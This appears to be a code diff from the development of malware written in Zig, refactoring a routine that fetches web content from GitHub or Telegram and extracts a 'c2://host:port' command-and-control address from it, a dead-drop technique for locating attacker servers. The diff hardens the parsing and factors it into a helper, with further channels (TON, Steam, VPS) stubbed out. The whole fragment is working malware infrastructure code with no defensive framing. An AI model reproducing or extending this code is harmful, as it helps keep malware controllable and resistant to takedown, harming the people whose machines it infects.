@@ -31,8 +31,30 @@ fn parseC2FromResponse(body: []const u8, allocator: std.mem.Allocator) ?[]const 
     const prefix = "c2://";
     const start = std.mem.indexOf(u8, body, prefix) orelse return null;
     const value_start = start + prefix.len;
-    const end = std.mem.indexOfAny(u8, body[value_start..], &[_]u8{ '\r', '\n', ' ', '<' }) orelse body.len;
-    return allocator.dupe(u8, body[value_start..][0..end]) catch null;
+    const remaining = body[value_start..];
+    if (remaining.len == 0) return null;
+    const max_c2_len = @min(remaining.len, 256);
+    const end = std.mem.indexOfAny(u8, remaining[0..max_c2_len], &[_]u8{ '\r', '\n', ' ', '<', '\t', '"', '\'' }) orelse max_c2_len;
+    if (end == 0) return null;
+    return allocator.dupe(u8, remaining[0..end]) catch null;
+}
+
+fn parseC2Address(c2_str: []const u8, allocator: std.mem.Allocator) ?ProxyResult {
+    const colon = std.mem.indexOfScalar(u8, c2_str, ':') orelse return null;
+    const host_slice = c2_str[0..colon];
+    if (host_slice.len == 0 or host_slice.len > 255) return null;
+    for (host_slice) |c| {
+        if (c == 0) return null;
+    }
+    const port = std.fmt.parseInt(u16, c2_str[colon + 1 ..], 10) catch return null;
+    if (port == 0) return null;
+
+    const host = allocator.dupe(u8, host_slice) catch return null;
+    return ProxyResult{
+        .c2_host = host,
+        .c2_port = port,
+        .level = .github,
+    };
 }
 
 pub fn resolve(allocator: std.mem.Allocator, channel: ProxyLevel) ?ProxyResult {
@@ -59,28 +81,11 @@ pub fn resolve(allocator: std.mem.Allocator, channel: ProxyLevel) ?ProxyResult {
             if (resp.status != 200) return null;
 
             const c2_str = parseC2FromResponse(resp.body, allocator) orelse return null;
+            defer allocator.free(c2_str);
 
-            const colon = std.mem.indexOfScalar(u8, c2_str, ':') orelse {
-                allocator.free(c2_str);
-                return null;
-            };
-
-            const host = allocator.dupe(u8, c2_str[0..colon]) catch {
-                allocator.free(c2_str);
-                return null;
-            };
-            const port = std.fmt.parseInt(u16, c2_str[colon + 1 ..], 10) catch {
-                allocator.free(c2_str);
-                allocator.free(host);
-                return null;
-            };
-            allocator.free(c2_str);
-
-            return ProxyResult{
-                .c2_host = host,
-                .c2_port = port,
-                .level = .github,
-            };
+            var result = parseC2Address(c2_str, allocator) orelse return null;
+            result.level = .github;
+            return result;
         },
         .telegram => {
             var tg_host_buf: [16]u8 = undefined;
@@ -103,28 +108,11 @@ pub fn resolve(allocator: std.mem.Allocator, channel: ProxyLevel) ?ProxyResult {
             if (resp.status != 200) return null;
 
             const c2_str = parseC2FromResponse(resp.body, allocator) orelse return null;
+            defer allocator.free(c2_str);
 
-            const colon = std.mem.indexOfScalar(u8, c2_str, ':') orelse {
-                allocator.free(c2_str);
-                return null;
-            };
-
-            const host = allocator.dupe(u8, c2_str[0..colon]) catch {
-                allocator.free(c2_str);
-                return null;
-            };
-            const port = std.fmt.parseInt(u16, c2_str[colon + 1 ..], 10) catch {
-                allocator.free(c2_str);
-                allocator.free(host);
-                return null;
-            };
-            allocator.free(c2_str);
-
-            return ProxyResult{
-                .c2_host = host,
-                .c2_port = port,
-                .level = .telegram,
-            };
+            var result = parseC2Address(c2_str, allocator) orelse return null;
+            result.level = .telegram;
+            return result;
         },
         .ton, .steam, .vps => {
             return null;
